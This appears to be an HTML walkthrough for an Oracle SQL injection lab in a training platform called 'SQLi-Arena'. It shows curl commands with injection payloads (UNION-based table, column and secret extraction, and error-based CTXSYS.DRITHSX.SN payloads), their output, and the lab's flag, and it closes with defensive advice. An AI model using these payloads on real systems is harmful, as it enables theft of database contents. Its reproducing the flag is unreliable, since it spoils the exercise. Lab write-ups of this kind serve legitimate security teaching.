<h4>Step 1: Test Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab5" \<br> --data-urlencode "dept=Engineering"<br><br>
        <span class="prompt">Input: </span>Engineering<br>
        <span class="prompt">SQL: </span>SELECT id, name, department FROM employees WHERE department = 'Engineering'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> 1 | <strong>Name:</strong> Alice Johnson | <strong>Department:</strong> Engineering
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab5" \<br> --data-urlencode "dept='"<br><br>
        <span class="prompt">Input: </span>'<br>
        <span class="prompt">Error: </span><strong>ORA-01756: quoted string not properly terminated</strong>
    </div>
</div>

<h4>Step 3: CTXSYS.DRITHSX.SN Concept</h4>
<p>
    <code>CTXSYS.DRITHSX.SN(index_id, keyword)</code> is an Oracle Text internal function.
    When called with a non-existent index (like 1) and a keyword string, it throws a
    <code>DRG-11701</code> error that includes the keyword value: leaking subquery results.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. CTXSYS Attempt</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab5" \<br> --data-urlencode "dept=' OR 1=CTXSYS.DRITHSX.SN(1,(SELECT secret FROM admin_secrets WHERE ROWNUM <= 1)) -- "<br><br>
        <span class="prompt">Input: </span>' OR 1=CTXSYS.DRITHSX.SN(1,(SELECT secret FROM admin_secrets WHERE ROWNUM &lt;= 1)) -- <br>
        <span class="prompt">Error: </span><strong>ORA-00904: "CTXSYS"."DRITHSX"."SN": invalid identifier</strong><br><br>
        <span class="prompt">// Oracle Text (CTXSYS) is NOT installed in this Oracle XE instance.</span><br>
        <span class="prompt">// In Enterprise Edition with Oracle Text: DRG-11701: thesaurus FLAG{...} does not exist</span>
    </div>
</div>

<h4>Step 4: Enumerate Tables via UNION</h4>
<p>
    Since CTXSYS is unavailable, fall back to UNION-based extraction.
    The query has 3 columns (id, name, department).
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Enumerate Tables</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab5" \<br> --data-urlencode "dept=XXXXNOMATCH' UNION SELECT 0, table_name, 'x' FROM user_tables -- "<br><br>
        <span class="prompt">Input: </span>XXXXNOMATCH' UNION SELECT 0, table_name, 'x' FROM user_tables -- <br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> EMPLOYEES<br>
        <strong>Name:</strong> <strong>ADMIN_SECRETS</strong>
    </div>
</div>

<h4>Step 5: Enumerate Columns</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Column Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab5" \<br> --data-urlencode "dept=XXXXNOMATCH' UNION SELECT 0, column_name, data_type FROM all_tab_columns WHERE table_name='ADMIN_SECRETS' -- "<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> ID | <strong>Department:</strong> NUMBER<br>
        <strong>Name:</strong> SECRET | <strong>Department:</strong> VARCHAR2
    </div>
</div>

<h4>Step 6: Extract the Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab5" \<br> --data-urlencode "dept=XXXXNOMATCH' UNION SELECT id, secret, 'x' FROM admin_secrets -- "<br><br>
        <span class="prompt">Input: </span>XXXXNOMATCH' UNION SELECT id, secret, 'x' FROM admin_secrets -- <br><br>
        <span class="prompt">Output:</span><br>
        <strong>Name:</strong> <strong>FLAG{or_ctxsys_dr1thsx}</strong>
    </div>
</div>

<h4>Step 7: CTXSYS Reference (When Available)</h4>
<p>
    On Oracle Enterprise Edition or Standard Edition with Oracle Text installed,
    CTXSYS provides powerful error-based extraction:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. CTXSYS Reference</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Table discovery: </span>' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM user_tables WHERE ROWNUM&lt;=1)) --<br>
        <span class="prompt">Expected error:  </span>DRG-11701: thesaurus ADMIN_SECRETS does not exist<br><br>
        <span class="prompt">Column discovery:</span>' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT column_name FROM all_tab_columns WHERE table_name='ADMIN_SECRETS' AND ROWNUM&lt;=1)) --<br>
        <span class="prompt">Expected error:  </span>DRG-11701: thesaurus ID does not exist<br><br>
        <span class="prompt">Flag extraction: </span>' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT secret FROM admin_secrets WHERE ROWNUM&lt;=1)) --<br>
        <span class="prompt">Expected error:  </span>DRG-11701: thesaurus FLAG{or_ctxsys_dr1thsx} does not exist
    </div>
</div>

<h4>Step 8: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{or_ctxsys_dr1thsx}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab5" \<br> --data-urlencode "dept=XXXXNOMATCH' UNION SELECT id, secret, 'x' FROM admin_secrets -- "<br><br>
        <span class="prompt">// Verified output:</span><br>
        <strong>Name:</strong> FLAG{or_ctxsys_dr1thsx}
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> <code>CTXSYS.DRITHSX.SN()</code> is an Oracle Text function that
    leaks subquery results through <code>DRG-11701</code> error messages. It requires Oracle Text
    to be installed (not available in all Oracle XE instances). When CTXSYS is unavailable, UNION-based
    extraction works reliably. Defense: suppress error details, use bind variables, and revoke
    unnecessary privileges on CTXSYS packages.
</div>
